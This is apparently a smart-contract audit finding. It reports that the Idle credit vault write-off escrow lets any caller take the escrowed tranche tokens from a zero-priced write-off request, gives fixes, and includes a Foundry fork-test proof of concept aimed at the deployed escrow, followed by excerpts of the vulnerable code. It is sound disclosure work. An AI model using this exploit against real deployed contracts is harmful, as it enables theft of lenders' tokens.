### Title
Zero-priced write-off requests let any fulfiller steal escrowed tranche tokens - (File: contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`createWriteOffRequest` accepts an `underlyingsRequested` value of zero while custodying the lender’s tranche tokens. Because `fullfillWriteOffRequest` is permissionless and only requires `_underlyings >= currentRequest.underlyings`, any EOA can complete the zero-priced request, pay no underlying, and receive all escrowed tranche tokens. [1](#0-0) [2](#0-1) 

### Finding Description
A lender can create a write-off request only while the credit-vault epoch is running, and the function validates that the deposited tranche amount is nonzero. [3](#0-2) 

The request then stores the tranche amount and requested underlying amount, but there is no `underlyingsRequested == 0` rejection and no designated fulfiller field. [4](#0-3) 

The fulfillment function is explicitly callable by any wallet and accepts the request when the supplied tranche amount exactly matches the request and `_underlyings` is at least the requested amount. [5](#0-4) 

For a request with `underlyingsRequested == 0`, passing `_underlyings == 0` satisfies the check, produces a zero exit fee, sends zero underlying to the lender, and transfers all escrowed tranche tokens to the caller. [6](#0-5) 

This is an input-sanitization analog: the escrow fails to reject a nonsensical zero-consideration order, allowing an unrestricted caller to bypass the intended lender-to-approved-buyer exchange. [7](#0-6) 

### Impact Explanation
An unprivileged attacker can steal 100% of the tranche tokens escrowed in any zero-priced write-off request without transferring underlying to the lender. [8](#0-7) 

The quantified loss is the full `currentRequest.tranches` balance, valued at the CDO’s current tranche price; no existing check preserves either lender consent to the fulfiller or a minimum nonzero consideration. [5](#0-4) 

This can be especially harmful when a lender creates a zero-payment request intending that the configured borrower complete a debt write-off: `borrower` is stored, but fulfillment does not restrict the caller to that borrower. [9](#0-8) [5](#0-4) 

### Likelihood Explanation
Exploitation requires a lender to create a request with `underlyingsRequested == 0`; thereafter any observer can fulfill it in the same transaction sequence or a later epoch state because fulfillment itself has no epoch, borrower, or whitelist restriction. [10](#0-9) [5](#0-4) 

The attack does not require privileged access, borrower cooperation, malformed tokens, oracle manipulation, or a reentrancy path. [8](#0-7) 

### Recommendation
Reject zero-value requests in `createWriteOffRequest` with `if (underlyingsRequested == 0) revert InvalidAmount()`. [1](#0-0) 

If zero-consideration borrower write-offs are intentional, add an approved `fulfiller` or restrict zero-priced fulfillment to `msg.sender == borrower`; otherwise a zero ask remains equivalent to an unrestricted transfer of the escrowed tranche tokens. [2](#0-1) 

### Proof of Concept

The following Foundry fork test uses a real tranche holder and the deployed production escrow. [11](#0-10) 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Test} from "forge-std/Test.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";

contract ZeroAskWriteOffEscrowPoC is Test {
    function testAnyCallerStealsZeroAskEscrowedTranches() external {
        IdleCreditVaultWriteOffEscrow escrow =
            IdleCreditVaultWriteOffEscrow(vm.envAddress("WRITE_OFF_ESCROW"));

        // A real holder of the escrowed tranche token on the fork.
        address lender = vm.envAddress("TRANCHE_HOLDER");
        address attacker = makeAddr("attacker");

        IERC20Detailed tranche = IERC20Detailed(escrow.tranche());
        uint256 trancheAmount = 1_000 * 1e18;
        require(tranche.balanceOf(lender) >= trancheAmount, "insufficient fork balance");

        vm.startPrank(lender);
        tranche.approve(address(escrow), trancheAmount);
        escrow.createWriteOffRequest(trancheAmount, 0);
        vm.stopPrank();

        uint256 lenderUnderlyingBefore =
            IERC20Detailed(escrow.underlying()).balanceOf(lender);
        uint256 attackerTranchesBefore = tranche.balanceOf(attacker);

        // No underlying approval or payment is needed.
        vm.prank(attacker);
        escrow.fullfillWriteOffRequest(lender, trancheAmount, 0);

        assertEq(
            IERC20Detailed(escrow.underlying()).balanceOf(lender),
            lenderUnderlyingBefore,
            "lender received no underlying"
        );
        assertEq(
            tranche.balanceOf(attacker) - attackerTranchesBefore,
            trancheAmount,
            "attacker stole escrowed tranches"
        );
        assertEq(
            tranche.balanceOf(address(escrow)),
            0,
            "escrow tranche balance drained"
        );
    }
}
```

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }

  /// @notice delete the write-off request and transfer tranche tokens back to the user
  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
  }

  /// @notice fulfill the write-off request by buying the escrowed tranche tokens
  /// @param _user address of the user that made the write-off request
  /// @param _tranches amount of tranche tokens to transfer
  /// @param _underlyings amount of underlyings to transfer
  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
